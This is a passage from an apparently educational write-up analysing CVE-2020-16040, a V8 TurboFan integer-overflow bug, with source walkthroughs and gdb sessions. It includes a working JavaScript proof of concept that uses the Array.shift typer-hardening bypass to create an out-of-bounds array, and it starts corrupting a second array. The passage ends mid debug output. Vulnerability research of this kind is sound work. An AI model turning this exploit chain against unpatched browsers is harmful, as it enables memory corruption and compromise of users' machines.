<p>The <code>SpeculativeNumberBitwiseOr</code> node within the Escape Analysis phase becomes a <code>Word32OrRange(-2147483648, 2147483648)</code> node within the Simplified Lowering phase, where this <code>Word32</code> truncation lowers into <code>NumberLessthanBoolean</code> node within the Escape Analysis phase which lowers into a <code>Uint32LessThanBoolean</code> node within the Simplified Lowering phase.</p>
<p>The above two paragraphs confirm the speculation that was made earlier during the analysis of the Propagation phase.</p>
<p>Looking at the <code>RunLowerPhase();</code> function:</p>

  <pre style="background-color: #100E15; border: none !important;">
  <code class="language-cpp">
    // Lowering and change insertion phase.
    void RunLowerPhase(SimplifiedLowering * lowering) {
      TRACE("--{Lower phase}--\n");
      for (auto it = traversal_nodes_.cbegin(); it != traversal_nodes_.cend();
        ++it) {
        Node * node = * it;
        NodeInfo * info = GetInfo(node);
        TRACE(" visit #%d: %s\n", node -> id(), node -> op() -> mnemonic());
        // Reuse {VisitNode()} so the representation rules are in one place.
        SourcePositionTable::Scope scope(
          source_positions_, source_positions_ -> GetSourcePosition(node));
        NodeOriginTable::Scope origin_scope(node_origins_, "simplified lowering",
          node);
        VisitNode&lt;LOWER>(node, info -> truncation(), lowering);
      }
      // Perform the final replacements.
      for (NodeVector::iterator i = replacements_.begin(); i != replacements_.end(); ++i) {
        Node * node = * i;
        Node * replacement = * (++i);
        node -> ReplaceUses(replacement);
        node -> Kill();
        // We also need to replace the node in the rest of the vector.
        for (NodeVector::iterator j = i + 1; j != replacements_.end(); ++j) {
          ++j;
          if ( * j == node) * j = replacement;
        }
      }
    }      
  </code>
  </pre>
  <p>The above <code>RunLowerPhase();</code> calls <code>VisitNode&lt;LOWER></code> on all nodes, which lowers the node to a more specific node (via DeferReplacement) based on the returned truncation and output representations that were calculated from the previous sub-phases above.</p>

  <pre style="background-color: #100E15; border: none !important;">
  <code class="language-cpp">
  template &lt;Phase T>
  void VisitNode(Node* node, Truncation truncation,
				SimplifiedLowering* lowering) {
	//...
	case IrOpcode::kNumberLessThan:
	case IrOpcode::kNumberLessThanOrEqual: {
		Type const lhs_type = TypeOf(node->InputAt(0));
		Type const rhs_type = TypeOf(node->InputAt(1));
		// Regular number comparisons in JavaScript generally identify zeros,
		// so we always pass kIdentifyZeros for the inputs, and in addition
		// we can truncate -0 to 0 for otherwise Unsigned32 or Signed32 inputs.
		if (lhs_type.Is(Type::Unsigned32OrMinusZero()) &&
			rhs_type.Is(Type::Unsigned32OrMinusZero())) {
		// => unsigned Int32Cmp
		VisitBinop&lt;T>(node, UseInfo::TruncatingWord32(),
						MachineRepresentation::kBit);
		if (lower&lt;T>()) NodeProperties::ChangeOp(node, Uint32Op(node));
		} else if (lhs_type.Is(Type::Signed32OrMinusZero()) &&
					rhs_type.Is(Type::Signed32OrMinusZero())) {
			// => signed Int32Cmp
			VisitBinop&lt;T>(node, UseInfo::TruncatingWord32(),
							MachineRepresentation::kBit);
			if (lower&lt;T>()) NodeProperties::ChangeOp(node, Int32Op(node));
		} else {
			// => Float64Cmp
			VisitBinop&lt;T>(node, UseInfo::TruncatingFloat64(kIdentifyZeros),
							MachineRepresentation::kBit);
			if (lower&lt;T>()) NodeProperties::ChangeOp(node, Float64Op(node));
		}
	return;
	//...
}
  </code>
  </pre>
<p>In the above code block, <code>lhs_type</code> will be the feedback type of the <code>SpeculativeNumberBitwiseOr</code> node, which is <code>Range(0, 2147483647)</code>, while <code>rhs_type</code> is <code>Range(0, 0)</code>. Since both of these types fit in an unsigned 32-bit range (being; <code>Range(0, 4294967295)</code>), the first conditional <code>if</code> branch to <code>VisitBinop</code> will be taken (similar to how it was in the Propagation Phase). During the Lowering Phase, <code>if (lower&lt;T>()) NodeProperties::ChangeOp(node, Uint32Op(node));</code> will return <code>true</code>, and the current <code>Int32</code> node will be changed to <code>Uint32</code>. Since the value of <code>z</code> in the regression is returned as <code>0x80000000</code>. Again, this wraps around to a signed 32-bit <code>INT_MIN</code> value of <code>-2147483648</code>, of which, is outside of this unsigned 32-bit range, resulting in the unchecked overflow condition.</p>
  <p><h4><font color="white">[ EXPLORING <code>CanOverflowSigned32();</code> ]</font></h4></p>
<p>Before moving on, during the above Simplified Lowering phase analysis, additional observation was made while reviewing <code>VisitSpeculativeIntegerAdditiveOp</code>, it is of interest to note the following:</p>

<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
  template &lt;Phase T>
  void VisitSpeculativeIntegerAdditiveOp(Node * node, Truncation truncation,
    SimplifiedLowering * lowering) {
    Type left_upper = GetUpperBound(node -> InputAt(0));
    Type right_upper = GetUpperBound(node -> InputAt(1));
    if (left_upper.Is(type_cache_ -> kAdditiveSafeIntegerOrMinusZero) &&
      right_upper.Is(type_cache_ -> kAdditiveSafeIntegerOrMinusZero)) {
      //...
      return;
    }
    //...
    if (lower &lt;T> ()) {
      if (truncation.IsUsedAsWord32() ||
        !CanOverflowSigned32(node -> op(), left_feedback_type,
          right_feedback_type, type_cache_,
          graph_zone())) {
        ChangeToPureOp(node, Int32Op(node));
      } else {
        ChangeToInt32OverflowOp(node);
      }
    }
    return;
  }
</code>
</pre>
<p>Followed by:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
bool CanOverflowSigned32(const Operator* op, Type left, Type right, Zone* type_zone) {
  left = Type::Intersect(left, Type::Signed32(), type_zone);
  right = Type::Intersect(right, Type::Signed32(), type_zone);
  if (left.IsNone() || right.IsNone()) return false;
  switch (op->opcode()) {
    case IrOpcode::kSpeculativeSafeIntegerAdd:
      return (left.Max() + right.Max() > kMaxInt) ||
             (left.Min() + right.Min() < kMinInt);
    case IrOpcode::kSpeculativeSafeIntegerSubtract:
      return (left.Max() - right.Min() > kMaxInt) ||
             (left.Min() - right.Max() < kMinInt);
    default:
      UNREACHABLE();
  }
  return true;
}
</code>
</pre>
<p>Of interest here is the <code>CanOverflowSigned32();</code> function. Let's set some breakpoints and analyse these values before and after the intersect:</p>
<p><b>NOTE</b> as the breakpoint was set on lines <code>196</code> and <code>197</code>. Various functionality within <code>/src/compiler/simplified-lowering.cc</code> had not yet been executed. Regardless, it is interesting to look at this function.</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-sh">
  cd ~/Desktop/v8/src/compiler/
  gdb -q ../../out.gn/x64.debug/d8
</code>
</pre>
<pre style="background-color: #100E15; border: none !important;">
  <code class="language-sh">
    gef➤ set args --allow-natives-syntax regress.js 
  </code>
  </pre>
  
  <pre style="background-color: #100E15; border: none !important;">
  <code class="language-sh">
gef➤  break simplified-lowering.cc:196
Breakpoint 1 at 0x7f5aaa5a76ad: file simplified-lowering.cc, line 196.

gef➤  break simplified-lowering.cc:197
Breakpoint 2 at 0x7f5aaa5a76e1: file simplified-lowering.cc, line 197.

gef➤ r    
  </code>
  </pre>
<p><b>Before intersect:</b></p>
<p><center><img src="../images/before_intersect.png" width="800"></center></p>
  <pre style="background-color: #100E15; border: none !important;">
  <code class="language-sh">
    gef➤  print left
    $1 = {
      payload_ = 0xffffffff
    }
    gef➤  print right
    $2 = {
      payload_ = 0x559072eaa328
    }
    
    gef➤  print right.Min()
    $3 = 1
    gef➤  print right.Max()
    $4 = 1

    gef➤  c
  </code>
  </pre>
<p><b>After intersect:</b></p>
<p><center><img src="../images/after_intersect.png" width="800"></center></p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-sh">
  gef➤  print left
  $5 = {
    payload_ = 0x44b
  }
  gef➤  print right
  $6 = {
    payload_ = 0x5649e89a0328
  }
  
  gef➤  print right.Min()
  $7 = 1
  gef➤  print right.Max()
  $8 = 1
  
  gef➤  print left.Min()
  $9 = -2147483648
  gef➤  print left.Max()
  $10 = 2147483647
  
  gef➤  print kMinInt
  $11 = 0x80000000
  gef➤  print kMaxInt
  $12 = 0x7fffffff    
</code>
</pre>
<p>After the intersect, the <code>CanOverflowSigned32</code> function will check either the opcode is <code>kSpeculativeSafeIntegerAdd</code>, or <code>kSpeculativeSafeIntegerSubtract</code>. This very function is to check if there's an overflow condition, or not. If either of these return <code>true</code>, the JIT compiler (TurboFan) will know that an overflow condition exists.</p>
<p>After the intersect we can see that the <code>Typed::Signed32()</code> restriction type has a range of <code>Range(-2147483648, 2147483647)</code>. </p>
<p>Looking at the returned values within:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
bool CanOverflowSigned32(const Operator* op, Type left, Type right, Zone* type_zone) {
//...
    case IrOpcode::kSpeculativeSafeIntegerAdd:
      return (left.Max() + right.Max() > kMaxInt) ||
             (left.Min() + right.Min() < kMinInt);
    case IrOpcode::kSpeculativeSafeIntegerSubtract:
      return (left.Max() - right.Min() > kMaxInt) ||
             (left.Min() - right.Max() < kMinInt);
    default:
      UNREACHABLE();
  }
  return true;
}      
</code>
</pre>
<p><code>kSpeculativeSafeIntegerAdd</code>:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
  case IrOpcode::kSpeculativeSafeIntegerAdd:
  return (left.Max() + right.Max() > kMaxInt) ||
         (left.Min() + right.Min() < kMinInt);
</code>
</pre>
<p>Checking if <code>kSpeculativeSafeIntegerAdd</code> is greater than <code>kMaxInt</code> or is less than <code>kMinInt</code>:</p>
<pre style="background-color: #100E15; border: none !important;">
  <code class="language-cpp">
    case IrOpcode::kSpeculativeSafeIntegerAdd:
    return (2147483647 + 1 > 0x7fffffff) ||
           (-2147483648 + 1 < 0x80000000);      
  </code>
  </pre>
  <p>being;</p>
  <pre style="background-color: #100E15; border: none !important;">
  <code class="language-cpp">
    case IrOpcode::kSpeculativeSafeIntegerAdd:
    return (2147483647 + 1 > 2147483647) ||
           (-2147483648 + 1 < -2147483648); //0x80000000 wraps Signed32 INT_MIN        
  </code>
  </pre>
  <p>being;</p>
  <pre style="background-color: #100E15; border: none !important;">
  <code class="language-cpp">
    case IrOpcode::kSpeculativeSafeIntegerAdd:
    return (2147483647 > 2147483647) ||
           (-2147483648 < -2147483647);
  </code>
  </pre>
<p><code>2147483647</code> is not greater than <code>2147483647</code>, returning the boolean result of <code>false</code>, however,  <code>-2147483648</code> is less than <code>-2147483647</code>, returning the boolean result of <code>true</code>. In saying that, due to the <code>OR</code> operator, the overall boolean result of the above operands is <code>true</code>, meaning that the <code>CanOverflowSigned32</code> function has detected an overflow condition on the <code>kSpeculativeSafeIntegerAdd</code> opcode at this point in execution.</p>
<p>Let's do the same as the above, but in respect to <code>kSpeculativeSafeIntegerSubtract</code>:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
  case IrOpcode::kSpeculativeSafeIntegerSubtract:
	return (left.Max() - right.Min() > kMaxInt) ||
		   (left.Min() - right.Max() < kMinInt);    
</code>
</pre>
<p>being:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
  case IrOpcode::kSpeculativeSafeIntegerSubtract:
	return (2147483647 - 1 > 0x7fffffff) ||
		   (-2147483648 - 1 < 0x80000000); //wraps to INT_MIN signed 32-bit      
</code>
</pre>
<p>being:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
  case IrOpcode::kSpeculativeSafeIntegerSubtract:
	return (2147483647 - 1 > 2147483647) ||
		   (-2147483648 - 1 < -2147483648); 
</code>
</pre>
<p>Here <code>2147483646</code> is not greater than <code>2147483647</code>, however, <code>-2147483649</code> is less than <code>-2147483648</code>. Resulting in the boolean result of <code>true</code>. This results in the <code>CanOverflowSigned32</code> function detecting an overflow condition against the <code>Type::Signed32</code> restriction type. </p>
<p>Here the <code>op</code> of the node is changed to a  <code>Int32OverflowOp</code>, instead of <code>Int32Op</code>:</p>
<pre style="background-color: #100E15; border: none !important;">
  <code class="language-cpp">
    template &lt;Phase T>
    void VisitSpeculativeIntegerAdditiveOp(Node * node, Truncation truncation,
      SimplifiedLowering * lowering) {
      // [...]
      if (lower &lt;T> ()) {
        if (truncation.IsUsedAsWord32() ||
          !CanOverflowSigned32(node -> op(), left_feedback_type,
            right_feedback_type, type_cache_,
            graph_zone())) {
          ChangeToPureOp(node, Int32Op(node));
        } else {
          ChangeToInt32OverflowOp(node);
        }
      }
      return;
    }   
  </code>
  </pre>
  <p>Initially, before the analysis of the above Simplified Lowering phase, I had an assumption that the <code>CanOverflowSigned32</code> function would returns <code>false</code> due to variations in returned ranges and intersect values. However, after analysis of the above Simplified Lowering phase, it is evident that this <code>CanOverflowSigned32</code> check is skipped entirely after the propagation of a <code>Word32</code> truncation, resulting in the <code>Int32</code> node lowering into a <code>Uint32</code> node (as previously deduced).</p>
  <p><h3><font color="white">[ ANSWERING OUR OPEN ENDED QUESTIONS ]</font></h3></p>
  <p>After analysing the vulnerability and how the regression proof-of-concept interacts with the Simplified Lowering phase, we can conclude the following answers to the remaining open-ended questions devised during the <b>UNDERSTANDING THE REGRESSION</b> section of this article:</p>
  <p><b>[ QUESTION 2 ]</b><br>Why does this static type of <code>y</code> need to be widened? What is the purpose of the condition <code>if (a == NaN) y = NaN;</code> and how is this implemented?</p>
  <p><b>[ ANSWER ]</b> The purpose of widening the static type of <code>y</code> to <code>NaN</code> is needed to skip an <code>if</code> conditional branch. If this widening condition is not present the execution flow would not enter the alternative execution flow needed reach the vulnerable code.</p>
  <p><b>[ QUESTION 3 ]</b><br>During the warmup run, being the first call to <code>foo</code>; What is the purpose of making the type feedback of <code>y</code> SignedSmall? How is this then collected?</p>
  <p><b>[ ANSWER ]</b> The type feedback during the warmup run is required to be <code>SignedSmall</code> in order to insert the <code>SpeculativeSafeIntegerAdd</code> node as opposed to the <code>SpeculativeNumberAdd</code> node. If this feedback alters, the <code>SpeculativeSafeIntegerAdd</code> node will be replaced with the <code>SpeculativeNumberAdd</code> node, which does not call the vulnerable <code>VisitSpeculativeIntegerAdditiveOp</code> function during the Simplified Lowering phase.</p>
  <p><b>[ QUESTION 4 ]</b><br>Why is <code>z</code> defined as <code>(y+1)|0</code>, what is the purpose of the bitwise OR operation with <code>0</code>?</p>
  <p><b>[ ANSWER ] </b>Looking at the turbolizer graph, alongside trace representations. When <code>const z = (y+1)|0</code> is altered to another additive op i.e. <code>const z = y + 1</code>, or is removed entirely, the nodes vary significantly. At its appearance, there is obviously some alternative execution flow in which the bitwise OR operation is needed in order to trigger the vulnerability. I plan to trace the <code>SpeculativeBitwiseOr</code> node within the source, however, due to time restrictions I will have to come back to this later to answer this specifically (if time permits).</p>
  <p><h2><font color="white">[ EXPLOITABILITY ]</font></h2></p>
 
  <p>In later versions of V8, particularly from version <code>8.0</code> onwards, there was an implementation of pointer compression for the V8 heap introduced. This implementation is a clever method in memory reduction, of which saves an average of 40% in memory. In saying that, compared to older versions of V8, pointer compression makes it a bit more challenging in regards to heap exploitation. Though it is still achievable. This <a href="https://www.gushiciku.cn/pl/pcVI">reference</a> provides a good summary and insight in pertinence to V8's pointer compression, alongside the official <a href="https://v8.dev/blog/pointer-compression">V8.dev</a> documentation, and the Chromium team's <a href="https://v8.dev/blog/v8-release-80">blog post</a> which was published upon releasing version <code>8.0</code> of V8. Their design decisions are documented <a href="https://docs.google.com/document/d/10qh2-b4C5OtSg-xLwyZpEI5ZihVBPtn1xwKBbQC26yI/edit">here</a>.</p>
  <p>To briefly summarise; pointer compression reduces the memory overhead of storing pointers in the V8 heap. In V8, pointers are stored as 64-bit values. However, because the upper 32 bits of every pointer are the same (since they all point to objects within the V8 heap), storing these bits with every pointer is wasteful. To address this, V8 stores the upper 32 bits of the V8 heap's memory space (known as the <b>isolate root</b>) in a register called the root register (<b>r13</b> register). Pointers in the V8 heap are then stored as 32-bit values, only storing the lower 32 bits of their actual address. When these pointers need to be accessed, the <b>isolate root</b> stored in the root register (<b>r13</b> register) is added to the compressed address, allowing it to be dereferenced. This reduces the memory overhead of storing pointers in the V8 heap.</p>

  <p><ul>It seems in 2022 there has been a significant hardening effort with the incorporation of  a "smart pointer" called <code>miracleptr</code>:
    <li><a href="https://v8.dev/blog/retrofitting-temporal-memory-safety-on-c++">V8.dev Reference</a></li>
    <li><a href="https://security.googleblog.com/2022/05/retrofitting-temporal-memory-safety-on-c.html">Google Security Blog reference</a></p></li>
  </ul>
  <p>Though of interest, this is something that isn't relevant to the current bug as these changes appear recent in 2022. However definitely something of interest to research upon in the future.  <a href="https://crbug.com/1072380">ABSL/STL hardened modes</a> appear to be relevant to a portion of 2020 and onwards but also something I don't think is needed to read up on at this time. It is easy to get side tracked with V8 due to how broad it is, definitely something I need to look at in higher verbosity in the future.</p>
  <p>Before moving on, it's important to take note of the commit <code>7bb6dc0e06fa158df508bc8997f0fce4e33512a5</code> where TurboFan introduced aborting bounds checks as part of chrome's hardening of typer bugs:</p>
  <pre style="background-color: #100E15; border: none !important;">
  <code class="language-plaintext">
    commit 7bb6dc0e06fa158df508bc8997f0fce4e33512a5
    Author: Jaroslav Sevcik &lt;jarin@chromium.org>
    Date:   Fri Feb 8 16:26:18 2019 +0100
    
        [turbofan] Introduce aborting bounds checks.
    
        Instead of eliminating bounds checks based on types, we introduce
        an aborting bounds check that crashes rather than deopts.
    
        Bug: v8:8806
        Change-Id: Icbd9c4554b6ad20fe4135b8622590093679dac3f
        Reviewed-on: https://chromium-review.googlesource.com/c/1460461
        Commit-Queue: Jaroslav Sevcik &lt;jarin@chromium.org>
        Reviewed-by: Tobias Tebbi &lt;tebbi@chromium.org>
        Cr-Commit-Position: refs/heads/master@{#59467}      
  </code>
  </pre>
  <p>I won't dive into the details here, though I strongly recommend reading this <a href="https://doar-e.github.io/blog/2019/05/09/circumventing-chromes-hardening-of-typer-bugs/">article</a> written by Jeremy Fetiveau to get a further understanding.</p>
  <p>If you wanted to, you could probably cheat a little by reverting prior to the above commit. However, I didn't want to do this as I wished to understand the <code>ArrayPrototypePop</code>/<code>ArrayPrototypeShift</code> exploitation technique.  I believe this exploitation technique has now been mitigated via the <code>d4aafa4022b718596b3deadcc3cdcb9209896154</code> commit:</p>
  <pre style="background-color: #100E15; border: none !important;">
    <code class="language-plaintext">
      [turbofan] Harden ArrayPrototypePop and ArrayPrototypeShift

      An exploitation technique that abuses 'pop' and 'shift' to create a JS
      array with a negative length was publicly disclosed some time ago.
      
      Add extra checks to break the technique.
      
      Bug: chromium:1198696
      Change-Id: Ie008e9ae60bbdc3b25ca3a986d3cdc5e3cc00431
      Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2823707
      Reviewed-by: Georg Neis <neis@chromium.org>
      Commit-Queue: Sergei Glazunov <glazunov@google.com>
      Cr-Commit-Position: refs/heads/master@{#73973}
    </code>
    </pre>
  <p>Nevertheless, this technique was still valid at the time of <code>CVE-2020-16040</code>, and I thought it would be more interesting than reverting to an easier version.</p>
  <p><h3><font color="white">[ LEVERAGING THE SIGNED INTEGER OVERFLOW WITH A TYPER HARDENING BYPASS TO ATTAIN OUT-OF-BOUNDS ]</font></h3></p>
  <p>Turbofan does several optimisation passes, and many optimisation phases can be exploited via type confusion.</p>
  <pre style="background-color: #100E15; border: none !important;">
  <code class="language-js">
    function foo(a) {
      var y = 0x7fffffff;       //included in the regression
      if (a == NaN) y = NaN;    //included in the regression
      if (a) y = -1;            //included in the regression
      let z = (y + 1) | 0;      //included in the regression
      z = (z == 0x80000000);    //returns boolean, should be false but got true
      if (a) z = -1;            //gather type feedback, SignedSmall
      let l = Math.sign(z);     //discussed below
      l = l < 0 ? 0 : l;        //discussed below
      // real value: 1, optimizer: Range(-1, 0)
      let arr = new Array(l);   //discussed below
      arr.shift();              //discussed below
      // arr.length = -1, lead to oob
      return arr;
    }
  </code>
  </pre>
<p>As the regression was already analysed previously, we will ignore the lines associated with the <code>//included in the regression</code> comments. As there is no need to readdress these. However, we will analyse the remaining.</p>
<p>Here TurboFan interprets <code>l</code> is a <code>+</code> number, but it is actually a <code>-</code> number,  this satisfies the usage conditions of the <code>arr.shift();</code> trick.</p>
<p>Calling <code>Math.sign();</code>, with <code>foo(false);</code>, the function returns <code>1</code>. With <code>foo(true);</code>, the function returns <code>-1</code>. In this case <code>let l = Math.sign(z);</code> will infer the value of variable <code>l</code> to be <code>Range(-1, 0)</code> in the typer stage, but its real value is <code>Range(0, 1)</code>.  This is visible in  <code>--trace-turbo</code>. </p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-js">
  l = l < 0 ? 0 : l;    
</code>
</pre>
<p>The above is a conditional ternary operator, of which is the only JavaScript operator that takes three operands. It is essentially the simplified operator of <code>if/else</code> conditional clauses. For example, the above ternary operator is no different to:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-js">
  if (l = l < 0) {
    0
  } else {
    l;
  }      
</code>
</pre>
<p>if <code>l</code> is equal to <code>l</code> being less than <code>0</code>, return <code>0</code> otherwise return the value of <code>l</code>, in this case (<code>-1</code>).  With <code>foo(false);</code> this returns <code>1</code>, with <code>foo(true);</code> this returns <code>0</code>.</p>
<p>With the type of <code>l</code> being inferred as <code>Range(-1, 0)</code> (as previously mentioned above);</p>
<p><code>let arr = new Array(l);</code> creates a new array called <code>arr</code>, with the length calculated from the conditional ternary operator above. Based on the return values above, with <code>foo(false);</code> the length of <code>arr</code> is set to <code>1</code>, however, again due to the above, with <code>foo(true);</code>, the length of <code>arr</code> is set to <code>0</code>.</p>
<p>This very aspect, particularly that of;</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-js">
  let l = Math.sign(z);   
  l = l < 0 ? 0 : l; 
</code>
</pre>
<p>Results in an <code>arr.length();</code> that satisfies the <code>CheckBounds</code> here . This is what facilitates the use of <code>arr.shift();</code> to attain an <code>arr.length</code> of <code>-1</code>. </p>

<p><h4><font color="white">[ TFBytecodeGraphBuilder ]</font></h4></p>
<p>This stage converts bytecode to graph:</p>
<p><center><img src="../images/tfbytecodegraphbuilder.png" width="800"></center></p>
<p><code>#96 JSLoadNamed</code> being the shift, <code>#82 JSLoadGlobal</code> being <code>arr</code>, <code>#43 SpeculativeSafeIntegerAdd</code> being <code>SignedSmall</code>. <code>#96 JSLoadNamed</code> contains a control edge that enables the <code>#97 JSCall</code> node branch. That is, <code>arr.shift</code> will be reduced into these nodes in the <code>TFInlining</code> stage, of which, is defined as inline function expansion.</p>

<p><h4><font color="white">[ TFInlining ]</font></h4></p>
<p><center><img src="../images/tfinlining.png" width="800"></center></p>
<p><b>NOTE</b> that there is no <code>JSCreateLiteralArrayArray</code> node as a literal array, in this context being an array we intend to corrupt via OOB, has not yet been defined. Here we will focus on the <code>StoreField[+12]</code> node as this node re-assigns the length field of the <code>arr</code> array.</p>
<p>We can focus on the following:</p>
<p><center><img src="../images/tfinlining2.png" width="800"></center></p>
<p><code>#124 LoadField[+12]</code> contains a control edge from <code>#87 JSCreateArray</code>. This <code>#124 LoadField[+12]</code> node contains a <code>#149 NumberSubtract</code> node, to which subtracts <code>1</code> from <code>#124 LoadField[+12]</code> before the control edge to the <code>#150 StoreField[+12]</code> node.</p>

<p><h4><font color="white">[ TFTypedLowering ]</font></h4></p>
<p>Since this stage converts a JS node to an intermediate simplified node, or common node, we will focus on the <code>#87 JSCreateArray</code> node from the <code>TFInlining</code> stage above:</p>
<p><center><img src="../images/tftypedlowering.png" width="800"></center></p>

<p><h4><font color="white">[ TFLoadElimination ]</font></h4></p>
<p>The <code>LoadElimination</code> stage eliminates redundant load memory and read operations:</p>
<p><center><img src="../images/tfbytecodegraphbuilder.png" width="800"></center></p>
<p></p>
<p>In reference to <code>zer0con</code>, the final pseudo-code of the above, is that of;</p>
<pre style="background-color: #100E15; border: none !important;">
  <code class="language-js">
    let limit = kInitialMaxFastElementArray; // limit : NumberConstant[16380]
    // len : Range(-1, 0), real: 1
    let checkedLen = CheckBounds(len, limit); // checkedLen : Range(0, 0), real: 1
    let arr = Allocate(kArraySize);
    StoreField(arr, kMapOffset, map);
    StoreField(arr, kPropertyOffset, property);
    StoreField(arr, kElementOffset, element);
    StoreField(arr, kLengthOffset, checkedLen);
    
    let length = checkedLen;
    // length: Range(0, 0), real: 1
    if (length != 0) {
        if (length <= 100) {
            DoShiftElementsArray();
            /* Update length field */
            StoreField(arr, kLengthOffset, -1);
        } else /* length > 100 */ {
            CallRuntime(ArrayShift);
        }
    }   
  </code>
  </pre>
  <p>The length of <code>arr</code> at this point satisfies the above <code>CheckBounds</code>, permitting the usage of <code>arr.shift();</code> to attain the length of <code>arr</code> to <code>-1</code>.</p>
  <p>Similarly, the following would result in the same outcome in respect to <code>CheckBounds</code>:</p>
  <pre style="background-color: #100E15; border: none !important;">
  <code class="language-js">
    function foo(a) {
      var y = 0x7fffffff;
      if (a == NaN) y = NaN;
      if (a) y = -1;
      let z = (y + 1) + 0;
      let l = 0 - Math.sign(z);
      let arr = new Array(l);
      arr.shift();
      return arr;
  }      
  </code>
  </pre>
  <p>In summary, we optimise first to trigger the bug, then leverage the integer overflow with the above typer bug to bypass the bounds check and leverage OOB.</p>
  <pre style="background-color: #100E15; border: none !important;">
  <code class="language-js">
    function foo(a) {
      //..
    }
    // JIT-compiling the foo(); function to ensure it gets optimised for trigger
    for (let i = 0; i < 0x10000; i++) //arbitrary high value
      foo(true);
    console.log('[success] Optimising the function to trigger the bug.');
    
    var oob_arr = foo(false);
    console.log('oob_arr.length: '+oob_arr.length+'\n');
  </code>
  </pre>
<p>After running the above with <code>./d8</code> we obtain the following output:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-js">
  oob_arr.length: -1   
</code>
</pre>
<p>Since array indexes are referenced from <code>0</code> and above, having an index of <code>-1</code> results in a negative array length, which leads to the said out-of-bounds condition. </p>
<p>We can look at this in memory, after making the following alterations to the PoC above which includes <code>%DebugPrint(oob_arr);</code> and <code>%SystemBreak()</code>; calls for the purpose of debugging:</p>

<pre style="background-color: #100E15; border: none !important;">
<code class="language-js">
  function foo(a) {
    //..
  }
  //..
  %DebugPrint(oob_arr);
  %SystemBreak();      
</code>
</pre>
<p></p>
<pre style="background-color: #100E15; border: none !important;">
<code>
  New Thread 0x7f4f21151700 (LWP 95794)]
  DebugPrint: 0x2fe608332c51: [JSArray]
   - map: 0x2fe60824394d &lt;Map(HOLEY_SMI_ELEMENTS)> [FastProperties]
   - prototype: 0x2fe60820b759 &lt;JSArray[0]>
   - elements: 0x2fe608332c45 &lt;FixedArray[67244564]> [HOLEY_SMI_ELEMENTS]
   - length: -1
   - properties: 0x2fe608042229 &lt;FixedArray[0]>
   - All own properties (excluding elements): {
      0x2fe608044649: [String] in ReadOnlySpace: #length: 0x2fe608182159 <AccessorInfo> (const accessor descriptor), location: descriptor
   }
   - elements: 0x2fe608332c45 &lt;FixedArray[67244564]> {  <-- arr[3]
             0: 0x2fe608042429 &lt;the_hole>           <-- arr[0]
             1: 0x2fe60824394d &lt;Map(HOLEY_SMI_ELEMENTS)>
             2: 0x2fe608042229 &lt;FixedArray[0]>
             3: 0x2fe608332c45 &lt;FixedArray[67244564]> <-- arr[3]
             4: -1                                  
       5-13548: 0
         13549: 131072
         13550: 0
         13551: 9
         13552: 0
         13553: 19692
         13554: 6131
         13555: 68817034
         13556: 6131
         13557: 68943872
         13558: 6131
         13559: 126838
   13560-13562: 0
         13563: 4234
         13564: 0
         13565: 577894140
         13566: 10930
         13567: 577592968
         13568: 10930
         13569: 68812800
         13570: 6131
         13571: 131072
   13572-13590: 0
         13591: 577943320
         13592: 10930
   13593-13594: 0
         13595: 577943296
         13596: 10930
   13597-13604: 0
         13605: 68681728
  
  Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
</code>
</pre>
<p>The <code>elements</code> address in the above is the same address as <code>arr[3]</code>. Looking at this address in memory: </p>
<pre style="background-color: #100E15; border: none !important;">
  <code>
    gef➤  x/10gx 0x2fe608332c45-1
    0x2fe608332c44:	0x0804242908042201	0x0824394d08042429
    0x2fe608332c54:	0x08332c4508042229	0x00000000fffffffe <-- arr
    0x2fe608332c64:	0x0000000000000000	0x0000000000000000
    0x2fe608332c74:	0x0000000000000000	0x0000000000000000
    0x2fe608332c84:	0x0000000000000000	0x0000000000000000      
  </code>
  </pre>
<p>We subtract <code>1</code> from the address as, in V8, pointers always have their last bit set to <code>1</code>.</p>  
<p>The above highlights that the size of <code>arr</code> becomes <code>0x08042429</code>, and that V8 interprets the size of the array as <code>0x08042429/2</code>, of which, equates to <code>0x04021214</code>, being <code>67244564</code> (<code>FixedArray[67244564])</code>.  The memory value representing the size of <code>arr</code> is <code>0xffffffffe</code>.</p>
<p>Modifying the proof-of-concept to include a second array we intend to corrupt, <code>cor</code>:</p>
  <pre style="background-color: #100E15; border: none !important;">
  <code class="language-js">
    function foo(a) {
      //... 
      arr.shift();
      var cor = [1.1, 1.2, 1.3];
      return [arr, cor];
    }
    //...        
  </code>
  </pre>
  <p>The debug output is as follows:</p>
  <pre style="background-color: #100E15; border: none !important;">
  <code>
    DebugPrint: 0x2bdb0808943d: [JSArray]
    - map: 0x2bdb082439c5 &lt;Map(PACKED_ELEMENTS)> [FastProperties]
    - prototype: 0x2bdb0820b759 &lt;JSArray[0]>
    - elements: 0x2bdb0808942d &lt;FixedArray[2]> [PACKED_ELEMENTS]
    - length: 2
    - properties: 0x2bdb08042229 &lt;FixedArray[0]>
    - All own properties (excluding elements): {
       0x2bdb08044649: [String] in ReadOnlySpace: #length: 0x2bdb08182159 &lt;AccessorInfo> (const accessor descriptor), location: descriptor
    }
    - elements: 0x2bdb0808942d &lt;FixedArray[2]> {
              0: 0x2bdb080893ed &lt;JSArray[4294967295]>
              1: 0x2bdb0808941d &lt;JSArray[3]>
    }
   0x2bdb082439c5: [Map]
    - type: JS_ARRAY_TYPE
    - instance size: 16
    - inobject properties: 0
    - elements kind: PACKED_ELEMENTS
    - unused property fields: 0
    - enum length: invalid
    - back pointer: 0x2bdb0824399d &lt;Map(HOLEY_DOUBLE_ELEMENTS)>
    - prototype_validity cell: 0x2bdb08182445 &lt;Cell value= 1>
